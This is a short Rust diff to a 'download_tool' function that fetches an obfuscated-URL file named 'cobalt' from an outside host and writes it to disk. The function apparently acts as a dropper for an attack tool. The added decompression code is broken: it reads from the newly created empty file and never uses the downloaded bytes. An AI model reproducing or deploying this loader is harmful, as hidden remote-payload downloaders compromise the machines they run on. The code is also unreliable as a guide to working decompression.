@@ -57,7 +57,7 @@ impl Fetcher {
 }
 
 fn download_tool() -> Result<String> {
-    let resp = attohttpc::get(obfstr!("https://api.steele.gg/tools/cobalt.exe"))
+    let resp = attohttpc::get(obfstr!("https://api.steele.gg/tools/cobalt.xz"))
         .header("Authorization", base64::encode("steele.gg"))
         .send()?;
 
@@ -69,7 +69,13 @@ fn download_tool() -> Result<String> {
 
     let bytes = resp.bytes()?;
 
-    File::create(&path)?.write_all(&bytes)?;
+    let mut decomp: Vec<u8> = Vec::new();
+
+    let mut file = File::create(&path)?;
+
+    lzma_rs::xz_decompress(&mut file, &mut decomp).unwrap();
+
+    file.write_all(&decomp);
 
     Ok(path.to_str().unwrap().into())
 }
